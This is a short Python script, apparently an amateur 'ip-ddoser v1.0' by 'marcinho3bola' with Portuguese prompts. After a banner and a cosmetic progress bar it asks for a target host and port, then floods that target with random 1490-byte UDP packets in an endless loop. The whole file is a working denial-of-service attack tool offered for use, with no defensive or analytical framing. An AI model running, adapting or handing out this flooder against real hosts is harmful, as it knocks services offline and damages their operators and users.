# -*- coding: utf-8 -*-
# Made by: marcinho3bola

from time import sleep
import os, socket, random, sys

os.system("clear")
print ("\033[1;36mCodado por: marcinho3bola")

print("""
_|_|_|                          _|        _|
  _|    _|_|_|              _|_|_|    _|_|_|    _|_|      _|_|_|    _|_|    _|  _|_|
  _|    _|    _|  _|_|_|  _|    _|  _|    _|  _|    _|  _|_|      _|_|_|_|  _|_|
  _|    _|    _|  _|_|_|  _|    _|  _|    _|  _|    _|      _|_|  _|        _|
_|_|_|  _|_|_|              _|_|_|    _|_|_|    _|_|    _|_|_|      _|_|_|  _|
        _|
""")
print("\033[1;36mip-ddoser v1.0\n")

ip = raw_input("\033[1;36mHost: ")
port = int(input("\033[1;36mPorta: "))

os.system("clear")
print("[>                   ] 0%")
sleep(0.25)
os.system("clear")
print("[=====>              ] 25%")
sleep(0.25)
os.system("clear")
print("[==========>         ] 50%")
sleep(0.25)
os.system("clear")
print("[===============>    ] 75%")
sleep(0.25)
os.system("clear")
print("[====================] 100%")
sleep(0.25)
os.system("clear")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
sent = 1

while True:
	try:
		sock.sendto(bytes, (ip, port))
		print("\033[1;31m[*] %s -> %s:%s (ip-ddoser by marcinho3bola)" %(sent, ip, port))
		sent = sent + 1
	except KeyboardInterrupt:
		print("\033[1;36m\n\nVocê escolheu sair.")
		exit()
